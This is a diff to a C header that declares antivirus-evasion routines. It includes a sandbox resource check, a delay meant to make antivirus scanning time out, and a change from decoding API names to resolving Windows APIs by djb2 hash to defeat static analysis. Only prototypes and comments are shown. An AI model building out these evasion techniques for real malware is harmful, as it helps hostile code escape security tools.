@@ -16,10 +16,13 @@ bool check_resources();
 // execute complex calculations to make the AV timeout.
 void smart_delay();
 
-// --- ANTI-STATIC ANALYSIS (Dynamic API resolution)
+// --- ANTI-STATIC ANALYSIS (Dynamic API resolution with hashing)
 
-// takes encoded DLL and function data, decode them,
-// finds function address, encode it and return a generic pointer (FARPROC)
-FARPROC resolve_api(char* enc_dll, size_t dll_len, char* enc_func, size_t func_len, const char* key, size_t key_len);
+// hashing function
+DWORD djb2_hash(const char* str);
+
+// takes DDL handle and desired API hash,
+// finds function address and return a generic pointer (FARPROC)
+FARPROC get_api_by_hash(HMODULE hModule, DWORD api_hash);
 
 #endif
